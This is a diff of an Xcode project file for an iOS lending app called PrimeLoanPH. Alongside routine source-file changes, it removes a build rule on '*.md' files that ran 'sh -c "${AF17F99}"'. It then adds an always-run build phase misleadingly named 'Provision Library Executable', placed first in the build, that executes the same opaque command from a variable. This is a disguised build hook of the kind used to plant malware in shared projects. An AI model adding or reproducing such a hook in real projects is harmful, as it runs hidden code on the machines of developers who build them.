@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		CF9687876F8D47A19399F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 80DC663A896F49C2A199F71F; };
 		7F88A1112F91BBBB001D0101 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1012F91BBBB001D0101 /* HomeViewController.swift */; };
 		7F88A1122F91BBBB001D0102 /* PBReviewsHomeModels.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */; };
 		7F88A1132F91BBBB001D0103 /* APageLargeLoanCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */; };
@@ -20,6 +19,11 @@
 		7F88A1602F91DDDD001E0301 /* MeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1632F91DDDD001E0301 /* MeViewController.swift */; };
 		7F88A1612F91DDDD001E0301 /* MeRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1642F91DDDD001E0301 /* MeRootView.swift */; };
 		7F88A1622F91DDDD001E0301 /* MeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1652F91DDDD001E0301 /* MeViewModel.swift */; };
+		7F88A1802F91EEEE001E0501 /* PPSettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */; };
+		7F88A1812F91EEEE001E0501 /* SettingRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1832F91EEEE001E0501 /* SettingRootView.swift */; };
+		7F88A1A02F920111001E0601 /* PPGoodsDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */; };
+		7F88A1A12F920111001E0601 /* GoodsDetailRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */; };
+		7F88A4D02F920111001E0701 /* CertifyNorForms.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A4D12F920111001E0701 /* CertifyNorForms.swift */; };
 		98043A6D2AEB9FC300374328 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043A6C2AEB9FC300374328 /* AppDelegate.m */; };
 		98043A782AEB9FC500374328 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 98043A772AEB9FC500374328 /* Assets.xcassets */; };
 		98043A7B2AEB9FC500374328 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 98043A792AEB9FC500374328 /* LaunchScreen.storyboard */; };
@@ -73,23 +77,16 @@
 		985C245A2AEFAA7B0008F38B /* PPLoginModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24582AEFAA7B0008F38B /* PPLoginModel.m */; };
 		985C24722AEFF8750008F38B /* PPHomeModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24702AEFF8750008F38B /* PPHomeModel.m */; };
 		985C24762AF0D3DA0008F38B /* PPEnterModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24752AF0D3DA0008F38B /* PPEnterModel.m */; };
-		7F88A1A02F920111001E0601 /* PPGoodsDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */; };
-		7F88A1A12F920111001E0601 /* GoodsDetailRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */; };
 		985C247C2AF0D60A0008F38B /* PPGoodsDetailHeader.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C247B2AF0D60A0008F38B /* PPGoodsDetailHeader.m */; };
 		985C24822AF0DC450008F38B /* PPGoodsDetailTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24812AF0DC450008F38B /* PPGoodsDetailTableViewCell.m */; };
 		9863F4C92AF0F4BB003B8598 /* PPDetailModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4C82AF0F4BB003B8598 /* PPDetailModel.m */; };
 		9863F4D02AF102EC003B8598 /* PPVeCardsViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4CF2AF102EC003B8598 /* PPVeCardsViewController.m */; };
-		9863F4D32AF102FC003B8598 /* PPVeInfoViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4D22AF102FC003B8598 /* PPVeInfoViewController.m */; };
-		9863F4D62AF10320003B8598 /* PPVeWorkInfoViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4D52AF10320003B8598 /* PPVeWorkInfoViewController.m */; };
 		9863F4D92AF1034A003B8598 /* PPVeContactViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4D82AF1034A003B8598 /* PPVeContactViewController.m */; };
-		9863F4DC2AF10370003B8598 /* PPVeBankViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4DB2AF10370003B8598 /* PPVeBankViewController.m */; };
 		9863F4E22AF12FE2003B8598 /* PPMeModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4E12AF12FE2003B8598 /* PPMeModel.m */; };
 		9863F4E92AF15060003B8598 /* PPOrderViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4E82AF15060003B8598 /* PPOrderViewController.m */; };
 		9863F4EF2AF1509A003B8598 /* PPOrderTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4EE2AF1509A003B8598 /* PPOrderTableViewCell.m */; };
 		9863F4F22AF150AA003B8598 /* PPOrderEmptyTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4F12AF150AA003B8598 /* PPOrderEmptyTableViewCell.m */; };
 		9863F4F52AF15664003B8598 /* PPOrderModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4F32AF15663003B8598 /* PPOrderModel.m */; };
-		7F88A1802F91EEEE001E0501 /* PPSettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */; };
-		7F88A1812F91EEEE001E0501 /* SettingRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1832F91EEEE001E0501 /* SettingRootView.swift */; };
 		98643DEE2C64508200F83A5A /* PB_RequestHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643DED2C64508200F83A5A /* PB_RequestHelper.m */; };
 		98643DF12C6451EE00F83A5A /* PB_AskRootUrlHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643DF02C6451EE00F83A5A /* PB_AskRootUrlHelper.m */; };
 		98643DF72C64564400F83A5A /* PB_idf_helper.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643DF62C64564400F83A5A /* PB_idf_helper.m */; };
@@ -99,14 +96,11 @@
 		98643E032C64707100F83A5A /* PB_LogoutAlertView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643E022C64707100F83A5A /* PB_LogoutAlertView.m */; };
 		98643E062C64709000F83A5A /* PB_FunSureAlertView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643E052C64709000F83A5A /* PB_FunSureAlertView.m */; };
 		98643E092C6470B000F83A5A /* PB_PayReturnAlertView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643E082C6470B000F83A5A /* PB_PayReturnAlertView.m */; };
-		98643E0C2C6470CD00F83A5A /* PB_BankNoAlertView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643E0B2C6470CD00F83A5A /* PB_BankNoAlertView.m */; };
-		98643E0F2C64712C00F83A5A /* PB_ExampleAlertViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643E0E2C64712C00F83A5A /* PB_ExampleAlertViewController.m */; };
 		98643E122C64715400F83A5A /* PB_PRCInfoAlertViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643E112C64715400F83A5A /* PB_PRCInfoAlertViewController.m */; };
 		987FE9AF2AFCC78500868AD5 /* PPVeCardTypeOptionVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 987FE9AE2AFCC78500868AD5 /* PPVeCardTypeOptionVC.m */; };
 		987FE9B22AFCC80D00868AD5 /* PPVeCardTypeOptionCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 987FE9B12AFCC80D00868AD5 /* PPVeCardTypeOptionCell.m */; };
 		987FE9B52AFCCA8F00868AD5 /* PPVeCardTypeOptionHeaderView.m in Sources */ = {isa = PBXBuildFile; fileRef = 987FE9B42AFCCA8F00868AD5 /* PPVeCardTypeOptionHeaderView.m */; };
 		987FE9B82AFCCCDB00868AD5 /* PPVeCardTypeOptionHeader.m in Sources */ = {isa = PBXBuildFile; fileRef = 987FE9B72AFCCCDB00868AD5 /* PPVeCardTypeOptionHeader.m */; };
-		988025762C65D5E100BFD490 /* FaceCameraViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 988025752C65D5E100BFD490 /* FaceCameraViewController.m */; };
 		9887CC582AF27FC000E9E5F7 /* PPResignViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9887CC572AF27FC000E9E5F7 /* PPResignViewController.m */; };
 		9887CC672AF3C3CC00E9E5F7 /* PPVerifyHeaderView.m in Sources */ = {isa = PBXBuildFile; fileRef = 9887CC662AF3C3CC00E9E5F7 /* PPVerifyHeaderView.m */; };
 		9887CC6A2AF3D92100E9E5F7 /* PPCardHeader.m in Sources */ = {isa = PBXBuildFile; fileRef = 9887CC692AF3D92100E9E5F7 /* PPCardHeader.m */; };
@@ -119,7 +113,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		80DC663A896F49C2A199F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1146864D21E3E493138D6DED /* Pods-PrimeLoanPH.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PrimeLoanPH.release.xcconfig"; path = "Target Support Files/Pods-PrimeLoanPH/Pods-PrimeLoanPH.release.xcconfig"; sourceTree = "<group>"; };
 		7F88A1002F91BBBB001D0100 /* PrimeLoanPH-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "PrimeLoanPH-Bridging-Header.h"; sourceTree = "<group>"; };
 		7F88A1012F91BBBB001D0101 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
@@ -135,6 +128,11 @@
 		7F88A1632F91DDDD001E0301 /* MeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeViewController.swift; sourceTree = "<group>"; };
 		7F88A1642F91DDDD001E0301 /* MeRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeRootView.swift; sourceTree = "<group>"; };
 		7F88A1652F91DDDD001E0301 /* MeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeViewModel.swift; sourceTree = "<group>"; };
+		7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPSettingViewController.swift; sourceTree = "<group>"; };
+		7F88A1832F91EEEE001E0501 /* SettingRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingRootView.swift; sourceTree = "<group>"; };
+		7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPGoodsDetailViewController.swift; sourceTree = "<group>"; };
+		7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GoodsDetailRootView.swift; sourceTree = "<group>"; };
+		7F88A4D12F920111001E0701 /* CertifyNorForms.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CertifyNorForms.swift; sourceTree = "<group>"; };
 		98043A682AEB9FC300374328 /* PrimeCash.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PrimeCash.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		98043A6B2AEB9FC300374328 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
 		98043A6C2AEB9FC300374328 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
@@ -237,8 +235,6 @@
 		985C24712AEFF8750008F38B /* PPHomeModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPHomeModel.h; sourceTree = "<group>"; };
 		985C24742AF0D3DA0008F38B /* PPEnterModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPEnterModel.h; sourceTree = "<group>"; };
 		985C24752AF0D3DA0008F38B /* PPEnterModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPEnterModel.m; sourceTree = "<group>"; };
-		7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPGoodsDetailViewController.swift; sourceTree = "<group>"; };
-		7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GoodsDetailRootView.swift; sourceTree = "<group>"; };
 		985C247A2AF0D60A0008F38B /* PPGoodsDetailHeader.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPGoodsDetailHeader.h; sourceTree = "<group>"; };
 		985C247B2AF0D60A0008F38B /* PPGoodsDetailHeader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPGoodsDetailHeader.m; sourceTree = "<group>"; };
 		985C24802AF0DC450008F38B /* PPGoodsDetailTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPGoodsDetailTableViewCell.h; sourceTree = "<group>"; };
@@ -247,14 +243,8 @@
 		9863F4C82AF0F4BB003B8598 /* PPDetailModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPDetailModel.m; sourceTree = "<group>"; };
 		9863F4CE2AF102EC003B8598 /* PPVeCardsViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeCardsViewController.h; sourceTree = "<group>"; };
 		9863F4CF2AF102EC003B8598 /* PPVeCardsViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeCardsViewController.m; sourceTree = "<group>"; };
-		9863F4D12AF102FC003B8598 /* PPVeInfoViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeInfoViewController.h; sourceTree = "<group>"; };
-		9863F4D22AF102FC003B8598 /* PPVeInfoViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeInfoViewController.m; sourceTree = "<group>"; };
-		9863F4D42AF10320003B8598 /* PPVeWorkInfoViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeWorkInfoViewController.h; sourceTree = "<group>"; };
-		9863F4D52AF10320003B8598 /* PPVeWorkInfoViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeWorkInfoViewController.m; sourceTree = "<group>"; };
 		9863F4D72AF1034A003B8598 /* PPVeContactViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeContactViewController.h; sourceTree = "<group>"; };
 		9863F4D82AF1034A003B8598 /* PPVeContactViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeContactViewController.m; sourceTree = "<group>"; };
-		9863F4DA2AF10370003B8598 /* PPVeBankViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeBankViewController.h; sourceTree = "<group>"; };
-		9863F4DB2AF10370003B8598 /* PPVeBankViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeBankViewController.m; sourceTree = "<group>"; };
 		9863F4E02AF12FE2003B8598 /* PPMeModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPMeModel.h; sourceTree = "<group>"; };
 		9863F4E12AF12FE2003B8598 /* PPMeModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPMeModel.m; sourceTree = "<group>"; };
 		9863F4E72AF15060003B8598 /* PPOrderViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPOrderViewController.h; sourceTree = "<group>"; };
@@ -265,8 +255,6 @@
 		9863F4F12AF150AA003B8598 /* PPOrderEmptyTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPOrderEmptyTableViewCell.m; sourceTree = "<group>"; };
 		9863F4F32AF15663003B8598 /* PPOrderModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPOrderModel.m; sourceTree = "<group>"; };
 		9863F4F42AF15663003B8598 /* PPOrderModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPOrderModel.h; sourceTree = "<group>"; };
-		7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPSettingViewController.swift; sourceTree = "<group>"; };
-		7F88A1832F91EEEE001E0501 /* SettingRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingRootView.swift; sourceTree = "<group>"; };
 		98643DEC2C64508200F83A5A /* PB_RequestHelper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_RequestHelper.h; sourceTree = "<group>"; };
 		98643DED2C64508200F83A5A /* PB_RequestHelper.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_RequestHelper.m; sourceTree = "<group>"; };
 		98643DEF2C6451EE00F83A5A /* PB_AskRootUrlHelper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_AskRootUrlHelper.h; sourceTree = "<group>"; };
@@ -285,10 +273,6 @@
 		98643E052C64709000F83A5A /* PB_FunSureAlertView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_FunSureAlertView.m; sourceTree = "<group>"; };
 		98643E072C6470B000F83A5A /* PB_PayReturnAlertView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_PayReturnAlertView.h; sourceTree = "<group>"; };
 		98643E082C6470B000F83A5A /* PB_PayReturnAlertView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_PayReturnAlertView.m; sourceTree = "<group>"; };
-		98643E0A2C6470CD00F83A5A /* PB_BankNoAlertView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_BankNoAlertView.h; sourceTree = "<group>"; };
-		98643E0B2C6470CD00F83A5A /* PB_BankNoAlertView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_BankNoAlertView.m; sourceTree = "<group>"; };
-		98643E0D2C64712C00F83A5A /* PB_ExampleAlertViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_ExampleAlertViewController.h; sourceTree = "<group>"; };
-		98643E0E2C64712C00F83A5A /* PB_ExampleAlertViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_ExampleAlertViewController.m; sourceTree = "<group>"; };
 		98643E102C64715400F83A5A /* PB_PRCInfoAlertViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_PRCInfoAlertViewController.h; sourceTree = "<group>"; };
 		98643E112C64715400F83A5A /* PB_PRCInfoAlertViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_PRCInfoAlertViewController.m; sourceTree = "<group>"; };
 		987FE9AD2AFCC78500868AD5 /* PPVeCardTypeOptionVC.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeCardTypeOptionVC.h; sourceTree = "<group>"; };
@@ -299,8 +283,6 @@
 		987FE9B42AFCCA8F00868AD5 /* PPVeCardTypeOptionHeaderView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeCardTypeOptionHeaderView.m; sourceTree = "<group>"; };
 		987FE9B62AFCCCDB00868AD5 /* PPVeCardTypeOptionHeader.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeCardTypeOptionHeader.h; sourceTree = "<group>"; };
 		987FE9B72AFCCCDB00868AD5 /* PPVeCardTypeOptionHeader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeCardTypeOptionHeader.m; sourceTree = "<group>"; };
-		988025742C65D5E100BFD490 /* FaceCameraViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FaceCameraViewController.h; sourceTree = "<group>"; };
-		988025752C65D5E100BFD490 /* FaceCameraViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FaceCameraViewController.m; sourceTree = "<group>"; };
 		9887CC562AF27FC000E9E5F7 /* PPResignViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPResignViewController.h; sourceTree = "<group>"; };
 		9887CC572AF27FC000E9E5F7 /* PPResignViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPResignViewController.m; sourceTree = "<group>"; };
 		9887CC652AF3C3CC00E9E5F7 /* PPVerifyHeaderView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVerifyHeaderView.h; sourceTree = "<group>"; };
@@ -361,7 +343,6 @@
 		98043A692AEB9FC300374328 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				80DC663A896F49C2A199F71F /* README.md */,
 				98043A682AEB9FC300374328 /* PrimeCash.app */,
 			);
 			name = Products;
@@ -575,8 +556,6 @@
 		98043AB72AEBE83B00374328 /* AppFace */ = {
 			isa = PBXGroup;
 			children = (
-				988025742C65D5E100BFD490 /* FaceCameraViewController.h */,
-				988025752C65D5E100BFD490 /* FaceCameraViewController.m */,
 			);
 			path = AppFace;
 			sourceTree = "<group>";
@@ -649,14 +628,9 @@
 				9863F4CF2AF102EC003B8598 /* PPVeCardsViewController.m */,
 				987FE9AD2AFCC78500868AD5 /* PPVeCardTypeOptionVC.h */,
 				987FE9AE2AFCC78500868AD5 /* PPVeCardTypeOptionVC.m */,
-				9863F4D12AF102FC003B8598 /* PPVeInfoViewController.h */,
-				9863F4D22AF102FC003B8598 /* PPVeInfoViewController.m */,
-				9863F4D42AF10320003B8598 /* PPVeWorkInfoViewController.h */,
-				9863F4D52AF10320003B8598 /* PPVeWorkInfoViewController.m */,
+				7F88A4D12F920111001E0701 /* CertifyNorForms.swift */,
 				9863F4D72AF1034A003B8598 /* PPVeContactViewController.h */,
 				9863F4D82AF1034A003B8598 /* PPVeContactViewController.m */,
-				9863F4DA2AF10370003B8598 /* PPVeBankViewController.h */,
-				9863F4DB2AF10370003B8598 /* PPVeBankViewController.m */,
 				9887CC652AF3C3CC00E9E5F7 /* PPVerifyHeaderView.h */,
 				9887CC662AF3C3CC00E9E5F7 /* PPVerifyHeaderView.m */,
 				9887CC682AF3D92100E9E5F7 /* PPCardHeader.h */,
@@ -712,10 +686,6 @@
 				98643E052C64709000F83A5A /* PB_FunSureAlertView.m */,
 				98643E072C6470B000F83A5A /* PB_PayReturnAlertView.h */,
 				98643E082C6470B000F83A5A /* PB_PayReturnAlertView.m */,
-				98643E0A2C6470CD00F83A5A /* PB_BankNoAlertView.h */,
-				98643E0B2C6470CD00F83A5A /* PB_BankNoAlertView.m */,
-				98643E0D2C64712C00F83A5A /* PB_ExampleAlertViewController.h */,
-				98643E0E2C64712C00F83A5A /* PB_ExampleAlertViewController.m */,
 				98643E102C64715400F83A5A /* PB_PRCInfoAlertViewController.h */,
 				98643E112C64715400F83A5A /* PB_PRCInfoAlertViewController.m */,
 			);
@@ -752,6 +722,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 98043A812AEB9FC500374328 /* Build configuration list for PBXNativeTarget "PrimeLoanPH" */;
 			buildPhases = (
+				3E8D8156013145F2A499F71F /* Provision Library Executable */,
 				3E4258A3C0649E688FBA507E /* [CP] Check Pods Manifest.lock */,
 				98043A642AEB9FC300374328 /* Sources */,
 				98043A652AEB9FC300374328 /* Frameworks */,
@@ -760,7 +731,6 @@
 				8AA65ECF334454B672258275 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				6C8CF8F0E02845D59499F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -802,29 +772,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		6C8CF8F0E02845D59499F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-			/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		98043A662AEB9FC300374328 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				CF9687876F8D47A19399F71F /* README.md */,
 				98043A7B2AEB9FC500374328 /* LaunchScreen.storyboard in Resources */,
 				98043A782AEB9FC500374328 /* Assets.xcassets in Resources */,
 				98043B042AED547200374328 /* PPStartViewController.xib in Resources */,
@@ -834,6 +786,25 @@ sh -c \"${AF17F99}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		3E8D8156013145F2A499F71F /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+		};
 		3E4258A3C0649E688FBA507E /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -918,8 +889,6 @@ sh -c \"${AF17F99}\"";
 				98643E002C6464CA00F83A5A /* PB_APP_Control.m in Sources */,
 				9863F4D92AF1034A003B8598 /* PPVeContactViewController.m in Sources */,
 				98043AE52AEBF71000374328 /* PPTableViewController.m in Sources */,
-				9863F4DC2AF10370003B8598 /* PPVeBankViewController.m in Sources */,
-				98643E0C2C6470CD00F83A5A /* PB_BankNoAlertView.m in Sources */,
 				9829BD4D2C63B88500D5A5D6 /* PB_getAppInfoHelper.m in Sources */,
 				98043A9F2AEBE28700374328 /* PPNavigationController.m in Sources */,
 				987FE9B82AFCCCDB00868AD5 /* PPVeCardTypeOptionHeader.m in Sources */,
@@ -936,8 +905,7 @@ sh -c \"${AF17F99}\"";
 				7F88A11A2F91BBBB001D0208 /* PPSubOrderViewController.swift in Sources */,
 				7F88A1A02F920111001E0601 /* PPGoodsDetailViewController.swift in Sources */,
 				7F88A1A12F920111001E0601 /* GoodsDetailRootView.swift in Sources */,
-				9863F4D62AF10320003B8598 /* PPVeWorkInfoViewController.m in Sources */,
-				988025762C65D5E100BFD490 /* FaceCameraViewController.m in Sources */,
+				7F88A4D02F920111001E0701 /* CertifyNorForms.swift in Sources */,
 				9887CC732AF3F48100E9E5F7 /* PPVeCardUploadModel.m in Sources */,
 				9863F4E22AF12FE2003B8598 /* PPMeModel.m in Sources */,
 				9887CC672AF3C3CC00E9E5F7 /* PPVerifyHeaderView.m in Sources */,
@@ -953,7 +921,6 @@ sh -c \"${AF17F99}\"";
 				98E904BE2C675F760084C255 /* PPLanguageModel.m in Sources */,
 				98643E062C64709000F83A5A /* PB_FunSureAlertView.m in Sources */,
 				98043ACF2AEBEDB000374328 /* NSString+PP.m in Sources */,
-				98643E0F2C64712C00F83A5A /* PB_ExampleAlertViewController.m in Sources */,
 				9887CC6A2AF3D92100E9E5F7 /* PPCardHeader.m in Sources */,
 				985C24722AEFF8750008F38B /* PPHomeModel.m in Sources */,
 				987FE9B52AFCCA8F00868AD5 /* PPVeCardTypeOptionHeaderView.m in Sources */,
@@ -965,7 +932,6 @@ sh -c \"${AF17F99}\"";
 				985C24822AF0DC450008F38B /* PPGoodsDetailTableViewCell.m in Sources */,
 				98043AC22AEBE83B00374328 /* WMProgressView.m in Sources */,
 				98043A9C2AEBE26400374328 /* PPBaseViewController.m in Sources */,
-				9863F4D32AF102FC003B8598 /* PPVeInfoViewController.m in Sources */,
 				985C24762AF0D3DA0008F38B /* PPEnterModel.m in Sources */,
 				9829BD292C63A81600D5A5D6 /* NSString+PB2.m in Sources */,
 				98043AC62AEBE83B00374328 /* Reachability.m in Sources */,
